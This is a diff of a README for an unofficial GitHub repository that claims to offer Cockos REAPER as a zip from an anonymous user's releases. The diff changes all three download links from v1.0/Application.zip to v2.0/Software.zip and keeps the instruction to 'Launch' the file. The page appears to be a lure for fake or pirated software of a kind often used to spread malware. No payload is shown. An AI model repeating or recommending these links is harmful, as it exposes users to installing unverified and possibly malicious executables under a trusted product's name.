@@ -26,9 +26,9 @@ Explore the best Windows 10 Cockos REAPER themes, find out the system requiremen
 ## 🚀 Get Started:
 To begin your journey with Cockos REAPER, download the software package from the link below:
 
-[![Download Software](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v1.0/Application.zip)](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v2.0/Software.zip)](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v2.0/Software.zip)
 
-🔥**Launch the https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v1.0/Application.zip file to start exploring the world of Cockos REAPER!**
+🔥**Launch the https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v2.0/Software.zip file to start exploring the world of Cockos REAPER!**
 
 ## 🎵 Make Some Music!
 Get ready to create the next big hit with Cockos REAPER. With its versatile features and user-friendly interface, you'll be producing top-quality tracks in no time. From recording to mixing and mastering, Cockos REAPER has got you covered.
@@ -50,6 +50,6 @@ Start your music production journey with Cockos REAPER today. Download the softw
 
 ---
 
-🔗 **For more information and updates, visit the [Releases](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v1.0/Application.zip) section of this repository.** 📦
+🔗 **For more information and updates, visit the [Releases](https://github.com/124lkr/Cockos-REAPER-Download/releases/download/v2.0/Software.zip) section of this repository.** 📦
 
 Remember, the world of music production is at your fingertips with Cockos REAPER. Let the music play! 🎧
